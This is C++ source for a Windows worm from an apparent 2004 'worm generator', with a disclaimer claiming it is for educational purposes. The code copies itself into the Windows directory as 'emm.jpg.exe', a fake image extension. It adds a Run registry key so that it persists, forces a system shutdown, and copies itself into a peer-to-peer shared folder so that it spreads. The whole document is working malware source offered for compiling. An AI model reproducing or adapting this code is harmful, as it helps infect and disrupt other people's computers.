/*================================================================
   Retro's C++ Worm Generator 
   Version 0.2 27/10/04 
   http://retro.host.sk
   www.indovirus.net
   http://rrlf.host.sk
==================================================================
   You have to agree to take full responsability of any           
   damage caused by this file.                                    
   This file created is for educational purposes only and         
   that myself (Retro) cannot be held responsable for damages     
   by you for compiling the source code in this file.             
==================================================================*/

#include <windows.h>
#include <string.h>

char windir[MAX_PATH];

int APIENTRY WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
 char pathname[256];
 GetWindowsDirectory(windir, sizeof(windir));
 HMODULE hMe = GetModuleHandle(NULL);
 DWORD nRet = GetModuleFileName(hMe, pathname, 256);
 HKEY hKey;
 strcat(windir, "\\emm.jpg.exe");
 CopyFile(pathname, windir, 0);

 RegCreateKey (HKEY_CURRENT_USER, "Software\\PetiK", &hKey);
 RegSetValueEx (hKey, "EMM", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));

 InitiateSystemShutdown(0, 0, 0, TRUE, FALSE);
 
 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
 RegSetValueEx (hKey, "EMM", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));
 CopyFile(pathname, "C:\\My Shared Folder\\.exe", 0);
 return 0;
}
